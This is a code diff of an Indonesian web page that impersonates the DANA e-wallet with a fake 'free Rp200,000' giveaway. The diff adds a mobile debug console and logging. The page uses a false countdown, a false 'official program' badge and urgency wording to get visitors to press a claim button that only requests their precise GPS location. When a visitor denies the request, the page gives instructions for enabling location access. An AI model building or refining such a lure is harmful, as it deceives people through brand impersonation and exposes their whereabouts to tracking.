@@ -4,35 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DANA 200K - Klaim Saldo Gratis</title>
+    <!-- Load Eruda untuk console di HP -->
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <script>eruda.init();</script>
     <style>
+        /* ... (CSS SAMA SEPERTI SEBELUMNYA) ... */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             min-height: 100vh;
             background: linear-gradient(160deg, #0055ff 0%, #0088ff 50%, #00bbff 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 16px;
-            position: relative;
         }
-
-        /* Background pattern */
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: 
-                radial-gradient(circle at 20% 50%, rgba(255,255,255,0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 50%, rgba(255,255,255,0.1) 0%, transparent 50%);
-            pointer-events: none;
-        }
-
         .container {
             max-width: 420px;
             width: 100%;
@@ -40,17 +30,8 @@
             border-radius: 28px;
             padding: 0 0 24px 0;
             box-shadow: 0 25px 80px rgba(0, 50, 200, 0.4);
-            position: relative;
             overflow: hidden;
-            animation: slideUp 0.6s ease-out;
         }
-
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        /* ===== HEADER DANA ===== */
         .header-dana {
             background: linear-gradient(135deg, #0055ff, #0088ff);
             padding: 20px 24px 16px;
@@ -59,7 +40,6 @@
             gap: 12px;
             border-bottom: 1px solid rgba(255,255,255,0.1);
         }
-
         .logo-dana {
             width: 44px;
             height: 44px;
@@ -73,25 +53,18 @@
             color: #0055ff;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
-
         .header-text {
             flex: 1;
         }
-
         .header-text h2 {
             color: white;
             font-size: 18px;
             font-weight: 700;
-            letter-spacing: 0.5px;
         }
-
         .header-text p {
             color: rgba(255,255,255,0.8);
             font-size: 11px;
-            font-weight: 400;
-            letter-spacing: 0.3px;
         }
-
         .badge-header {
             background: rgba(255,255,255,0.2);
             color: white;
@@ -101,14 +74,11 @@
             font-weight: 600;
             border: 1px solid rgba(255,255,255,0.3);
         }
-
-        /* ===== HERO SECTION ===== */
         .hero-section {
             padding: 24px 24px 20px;
             text-align: center;
             background: linear-gradient(180deg, #f0f7ff 0%, #ffffff 100%);
         }
-
         .hero-badge {
             display: inline-block;
             background: linear-gradient(135deg, #ff6b6b, #ff4757);
@@ -120,12 +90,10 @@
             margin-bottom: 12px;
             animation: pulse 2s infinite;
         }
-
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.05); }
         }
-
         .hero-section h1 {
             font-size: 26px;
             font-weight: 800;
@@ -133,21 +101,17 @@
             line-height: 1.3;
             margin-bottom: 6px;
         }
-
         .hero-section h1 span {
             background: linear-gradient(135deg, #0055ff, #00bbff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-
         .hero-section p {
             color: #666;
             font-size: 14px;
             line-height: 1.6;
         }
-
-        /* ===== NOMINAL BOX ===== */
         .nominal-box {
             margin: 0 16px 20px;
             background: linear-gradient(135deg, #0055ff, #0088ff);
@@ -159,7 +123,6 @@
             overflow: hidden;
             box-shadow: 0 8px 30px rgba(0, 85, 255, 0.3);
         }
-
         .nominal-box::before {
             content: '💰';
             position: absolute;
@@ -169,18 +132,6 @@
             opacity: 0.1;
             transform: rotate(-15deg);
         }
-
-        .nominal-box::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -20%;
-            width: 100%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
-            pointer-events: none;
-        }
-
         .nominal-label {
             font-size: 13px;
             opacity: 0.85;
@@ -188,7 +139,6 @@
             position: relative;
             z-index: 1;
         }
-
         .nominal-amount {
             font-size: 46px;
             font-weight: 800;
@@ -197,12 +147,6 @@
             z-index: 1;
             text-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-
-        .nominal-amount small {
-            font-size: 20px;
-            font-weight: 600;
-        }
-
         .nominal-note {
             font-size: 12px;
             opacity: 0.8;
@@ -210,7 +154,6 @@
             position: relative;
             z-index: 1;
         }
-
         .nominal-note .check {
             display: inline-block;
             background: rgba(255,255,255,0.2);
@@ -218,12 +161,9 @@
             border-radius: 99px;
             font-size: 11px;
         }
-
-        /* ===== INFO ROWS ===== */
         .info-section {
             padding: 0 20px 20px;
         }
-
         .info-row {
             display: flex;
             justify-content: space-between;
@@ -231,11 +171,9 @@
             padding: 12px 0;
             border-bottom: 1px solid #f0f0f5;
         }
-
         .info-row:last-child {
             border-bottom: none;
         }
-
         .info-label {
             color: #888;
             font-size: 14px;
@@ -243,21 +181,14 @@
             align-items: center;
             gap: 8px;
         }
-
-        .info-label .icon {
-            font-size: 16px;
-        }
-
         .info-value {
             font-weight: 600;
             color: #1a1a2e;
             font-size: 14px;
         }
-
         .info-value.green {
             color: #00b36b;
         }
-
         .info-value .status-dot {
             display: inline-block;
             width: 8px;
@@ -267,17 +198,13 @@
             margin-right: 6px;
             animation: blink 1.5s infinite;
         }
-
         @keyframes blink {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
         }
-
         .info-value.red {
             color: #e53935;
         }
-
-        /* ===== TIMER ===== */
         .timer-box {
             background: #fff8e1;
             border: 1px solid #ffe082;
@@ -289,24 +216,20 @@
             margin: 0 20px 16px;
             transition: all 0.3s;
         }
-
         .timer-box.warning {
             background: #ffebee;
             border-color: #ef9a9a;
         }
-
         .timer-icon {
             font-size: 22px;
             animation: pulse 1.5s infinite;
         }
-
         .timer-text {
             flex: 1;
             font-size: 13px;
             color: #e65100;
             font-weight: 600;
         }
-
         .timer-text .countdown {
             font-size: 18px;
             font-weight: 800;
@@ -316,12 +239,9 @@
             border-radius: 8px;
             margin-left: 4px;
         }
-
         .timer-box.warning .timer-text .countdown {
             background: #c62828;
         }
-
-        /* ===== BUTTON KLAIM ===== */
         .btn-klaim {
             margin: 0 20px 12px;
             width: calc(100% - 40px);
@@ -340,35 +260,15 @@
             justify-content: center;
             gap: 10px;
             position: relative;
-            overflow: hidden;
         }
-
-        .btn-klaim::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
         .btn-klaim:active {
             transform: scale(0.97);
         }
-
         .btn-klaim:disabled {
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
         }
-
-        .btn-klaim .emoji {
-            font-size: 20px;
-        }
-
         .btn-klaim .loading-spinner {
             display: none;
             width: 20px;
@@ -378,99 +278,19 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-
         .btn-klaim.loading .loading-spinner {
             display: inline-block;
         }
-
         .btn-klaim.loading .btn-text {
             display: none;
         }
-
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
         .btn-klaim.success {
             background: linear-gradient(135deg, #00b36b, #00d68f);
             box-shadow: 0 8px 30px rgba(0, 179, 107, 0.35);
         }
-
-        /* ===== SYARAT ===== */
-        .syarat {
-            text-align: center;
-            font-size: 11px;
-            color: #aaa;
-            padding: 0 20px 20px;
-            line-height: 1.8;
-        }
-
-        .syarat .lock {
-            display: inline-block;
-            background: #f0f0f5;
-            padding: 2px 10px;
-            border-radius: 99px;
-            color: #888;
-        }
-
-        /* ===== STATUS RESULT ===== */
-        #status {
-            margin: 0 20px 16px;
-            padding: 16px;
-            border-radius: 14px;
-            font-size: 14px;
-            line-height: 1.8;
-            display: none;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-
-        #status.show {
-            display: block;
-        }
-
-        #status.success {
-            background: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
-        }
-
-        #status.error {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-        }
-
-        #status.loading {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            color: #856404;
-        }
-
-        /* ===== MAPS LINK ===== */
-        .maps-link {
-            display: none;
-            margin: 0 20px 12px;
-            padding: 14px;
-            background: #f0f7ff;
-            color: #0055ff;
-            text-align: center;
-            border-radius: 14px;
-            text-decoration: none;
-            font-weight: 600;
-            border: 2px dashed #0055ff;
-            transition: all 0.3s;
-        }
-
-        .maps-link.show {
-            display: block;
-        }
-
-        .maps-link:active {
-            transform: scale(0.97);
-        }
-
-        /* ===== WARNING HTTPS ===== */
         .warning-https {
             margin: 0 20px 16px;
             padding: 12px 16px;
@@ -482,42 +302,87 @@
             display: none;
             line-height: 1.6;
         }
-
         .warning-https.show {
             display: block;
         }
-
-        .warning-https strong {
+        #status {
+            margin: 0 20px 16px;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 14px;
+            line-height: 1.8;
+            display: none;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        #status.show {
             display: block;
-            margin-bottom: 4px;
         }
-
-        /* ===== ANIMATIONS ===== */
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-5px); }
+        #status.success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
         }
-
-        .float {
-            animation: float 3s ease-in-out infinite;
+        #status.error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
         }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 480px) {
-            body { padding: 12px; }
-            .container { border-radius: 20px; }
-            .hero-section h1 { font-size: 22px; }
-            .nominal-amount { font-size: 38px; }
-            .btn-klaim { font-size: 15px; padding: 15px; }
-            .info-row { padding: 10px 0; }
+        #status.loading {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
         }
+        .maps-link {
+            display: none;
+            margin: 0 20px 12px;
+            padding: 14px;
+            background: #f0f7ff;
+            color: #0055ff;
+            text-align: center;
+            border-radius: 14px;
+            text-decoration: none;
+            font-weight: 600;
+            border: 2px dashed #0055ff;
+        }
+        .maps-link.show {
+            display: block;
+        }
+        .syarat {
+            text-align: center;
+            font-size: 11px;
+            color: #aaa;
+            padding: 0 20px 20px;
+            line-height: 1.8;
+        }
+        .syarat .lock {
+            display: inline-block;
+            background: #f0f0f5;
+            padding: 2px 10px;
+            border-radius: 99px;
+            color: #888;
+        }
+        /* Tombol debug (opsional) */
+        .debug-btn {
+            margin: 0 20px 8px;
+            padding: 8px;
+            background: #eee;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #333;
+            cursor: pointer;
+            width: calc(100% - 40px);
+            text-align: center;
+        }
+        .debug-btn:active { background: #ddd; }
     </style>
 </head>
 <body>
 
 <div class="container">
 
-    <!-- ===== HEADER DANA ===== -->
+    <!-- Header DANA -->
     <div class="header-dana">
         <div class="logo-dana">💙</div>
         <div class="header-text">
@@ -527,14 +392,14 @@
         <span class="badge-header">🎉 PROMO</span>
     </div>
 
-    <!-- ===== HERO ===== -->
+    <!-- Hero -->
     <div class="hero-section">
         <div class="hero-badge">🔥 Terbatas · Hari Ini Saja</div>
         <h1>Selamat! Kamu Dapat<br><span>Rp200.000</span> Gratis</h1>
         <p>Klaim sekarang dan saldo langsung masuk ke DANA-mu</p>
     </div>
 
-    <!-- ===== NOMINAL ===== -->
+    <!-- Nominal -->
     <div class="nominal-box">
         <div class="nominal-label">💎 Total Hadiah Untukmu</div>
         <div class="nominal-amount">Rp200.000</div>
@@ -543,27 +408,27 @@
         </div>
     </div>
 
-    <!-- ===== INFO ===== -->
+    <!-- Info -->
     <div class="info-section">
         <div class="info-row">
-            <span class="info-label"><span class="icon">📊</span> Status</span>
+            <span class="info-label">📊 Status</span>
             <span class="info-value green"><span class="status-dot"></span>Aktif & Tersedia</span>
         </div>
         <div class="info-row">
-            <span class="info-label"><span class="icon">👤</span> Penerima</span>
+            <span class="info-label">👤 Penerima</span>
             <span class="info-value">Pengguna Terpilih</span>
         </div>
         <div class="info-row">
-            <span class="info-label"><span class="icon">⚡</span> Proses Cair</span>
+            <span class="info-label">⚡ Proses Cair</span>
             <span class="info-value">Instan (< 1 menit)</span>
         </div>
         <div class="info-row">
-            <span class="info-label"><span class="icon">⏰</span> Berlaku Hingga</span>
+            <span class="info-label">⏰ Berlaku Hingga</span>
             <span class="info-value red">Hari ini 23:59</span>
         </div>
     </div>
 
-    <!-- ===== TIMER ===== -->
+    <!-- Timer -->
     <div class="timer-box" id="timerBox">
         <span class="timer-icon">⏰</span>
         <span class="timer-text">
@@ -572,27 +437,29 @@
         </span>
     </div>
 
-    <!-- ===== WARNING HTTPS ===== -->
+    <!-- Warning HTTPS -->
     <div class="warning-https" id="warningHttps">
         <strong>⚠️ Koneksi Tidak Aman (HTTP)</strong>
         Browser memblokir akses lokasi.<br>
         <strong>Solusi:</strong> Hosting di <strong>Netlify</strong> atau <strong>Vercel</strong> (gratis & HTTPS)
     </div>
 
-    <!-- ===== BUTTON ===== -->
+    <!-- Tombol Klaim -->
     <button class="btn-klaim" id="btnKlaim" onclick="klaimSekarang()">
-        <span class="emoji">💰</span>
-        <span class="btn-text">Klaim Sekarang</span>
+        <span class="btn-text">💰 Klaim Sekarang</span>
         <span class="loading-spinner"></span>
     </button>
 
-    <!-- ===== STATUS ===== -->
+    <!-- Status -->
     <div id="status"></div>
 
-    <!-- ===== MAPS LINK ===== -->
+    <!-- Maps Link -->
     <a class="maps-link" id="mapsLink" href="#" target="_blank">🗺️ Lihat Lokasi di Google Maps</a>
 
-    <!-- ===== SYARAT ===== -->
+    <!-- Tombol Debug (untuk cek fungsi) -->
+    <button class="debug-btn" onclick="debugGeolocation()">🔍 Debug: Cek Geolocation</button>
+
+    <!-- Syarat -->
     <p class="syarat">
         Dengan mengklaim, kamu menyetujui syarat & ketentuan DANA.<br>
         <span class="lock">🔒 Program resmi · Tidak dipungut biaya</span>
@@ -602,18 +469,28 @@
 
 <script>
 // ============================================
-// 1. CEK HTTPS
+// 0. CEK SEGALA SESUATU SAAT LOAD
 // ============================================
+console.log('🚀 Website DANA 200K dimuat');
+console.log('🔍 Protocol:', window.location.protocol);
+console.log('🔍 Geolocation support:', !!navigator.geolocation);
+if (navigator.geolocation) {
+    console.log('✅ Geolocation API tersedia');
+} else {
+    console.error('❌ Geolocation API TIDAK tersedia!');
+}
+
+// Cek HTTPS
 if (window.location.protocol !== 'https:') {
     document.getElementById('warningHttps').classList.add('show');
     document.getElementById('btnKlaim').disabled = true;
-    console.warn('⚠️ Website menggunakan HTTP!');
+    console.warn('⚠️ Website menggunakan HTTP! Lokasi akan diblokir.');
 } else {
     console.log('✅ HTTPS - Aman');
 }
 
 // ============================================
-// 2. COUNTDOWN
+// 1. COUNTDOWN
 // ============================================
 let totalSecs = 9 * 60 + 59;
 const countdownEl = document.getElementById('countdown');
@@ -626,6 +503,7 @@ const countdownInterval = setInterval(() => {
         document.getElementById('btnKlaim').disabled = true;
         document.getElementById('btnKlaim').innerHTML = '⏰ Waktu Habis';
         timerBox.classList.add('warning');
+        console.warn('⏰ Countdown habis!');
         return;
     }
     totalSecs--;
@@ -633,58 +511,62 @@ const countdownInterval = setInterval(() => {
     const s = String(totalSecs % 60).padStart(2, '0');
     countdownEl.textContent = `${m}:${s}`;
     
-    // Warning jika < 3 menit
     if (totalSecs < 180) {
         timerBox.classList.add('warning');
     }
 }, 1000);
 
 // ============================================
-// 3. FUNGSI KLAIM
+// 2. FUNGSI KLAIM (DENGAN LOGGING)
 // ============================================
 function klaimSekarang() {
+    console.log('🟢 [klaimSekarang] Fungsi dipanggil!');
+    
     const btn = document.getElementById('btnKlaim');
     const statusDiv = document.getElementById('status');
     const mapsLink = document.getElementById('mapsLink');
     
-    // Reset
+    // Reset status
     statusDiv.className = '';
     statusDiv.style.display = 'none';
     mapsLink.classList.remove('show');
     
     // CEK HTTPS
     if (window.location.protocol !== 'https:') {
+        console.error('❌ [HTTPS] Protocol HTTP, tidak bisa lanjut.');
         statusDiv.className = 'show error';
         statusDiv.style.display = 'block';
         statusDiv.textContent = '❌ Website menggunakan HTTP!\n\nLokasi tidak bisa diakses.\n\nSolusi: Hosting di Netlify/Vercel (gratis & HTTPS)';
         return;
     }
     
-    // CEK SUPPORT
+    // CEK SUPPORT GEOLOCATION
     if (!navigator.geolocation) {
+        console.error('❌ [Geolocation] Browser tidak support.');
         statusDiv.className = 'show error';
         statusDiv.style.display = 'block';
         statusDiv.textContent = '❌ Browser tidak mendukung Geolocation.\n\nGunakan Chrome atau Firefox terbaru.';
         return;
     }
     
+    console.log('✅ [Geolocation] Support OK, mulai meminta lokasi...');
+    
     // LOADING
     btn.classList.add('loading');
     btn.disabled = true;
-    
     statusDiv.className = 'show loading';
     statusDiv.style.display = 'block';
     statusDiv.textContent = '⏳ Mengambil data lokasi...\n\nPastikan GPS aktif dan sinyal kuat.';
     
-    // AMBIL LOKASI
+    // PANGGIL GEOLOCATION
     navigator.geolocation.getCurrentPosition(
         // ===== SUKSES =====
         function(pos) {
+            console.log('✅ [Geolocation] Berhasil mendapatkan posisi:', pos);
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
             
-            // HIDE LOADING
             btn.classList.remove('loading');
             btn.classList.add('success');
             btn.innerHTML = '✅ Berhasil! Dana Diproses';
@@ -698,4 +580,45 @@ function klaimSekarang() {
                 `🌐 Longitude: ${lon.toFixed(7)}\n` +
                 `📏 Akurasi: ±${Math.round(acc)} meter\n` +
                 `🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n\n` +
-                '💰 Dana Rp200.000 sedang diproses k
+                '💰 Dana Rp200.000 sedang diproses ke akun DANA-mu...';
+            
+            mapsLink.href = `https://www.google.com/maps?q=${lat},${lon}`;
+            mapsLink.classList.add('show');
+            
+            console.log('📍 Koordinat:', lat, lon);
+        },
+        
+        // ===== ERROR =====
+        function(err) {
+            console.error('❌ [Geolocation] Error:', err);
+            btn.classList.remove('loading');
+            btn.disabled = false;
+            btn.innerHTML = '📍 Coba Lagi';
+            
+            let pesan = '';
+            let solusi = '';
+            
+            switch(err.code) {
+                case 1:
+                    pesan = '❌ Izin lokasi DITOLAK!';
+                    solusi = 'CARA AKTIFKAN:\n' +
+                            '1. Klik ikon 🔒 di address bar\n' +
+                            '2. Pilih "Izin Situs" / "Permissions"\n' +
+                            '3. Cari "Lokasi" → pilih "Izinkan"\n' +
+                            '4. Refresh halaman (F5)\n' +
+                            '5. Klik "Klaim Sekarang" lagi';
+                    break;
+                case 2:
+                    pesan = '❌ GPS tidak mendeteksi sinyal!';
+                    solusi = 'Pastikan:\n' +
+                            '• GPS aktif di HP\n' +
+                            '• Berada di ruang terbuka\n' +
+                            '• Sinyal internet stabil';
+                    break;
+                case 3:
+                    pesan = '❌ Waktu pengambilan habis!';
+                    solusi = 'Coba lagi dengan sinyal GPS yang lebih kuat.';
+                    break;
+                default:
+                    pesan = `❌ Error: ${err.message}`;
+                    solusi = 'Coba refresh halaman atau gunakan browser lain.';
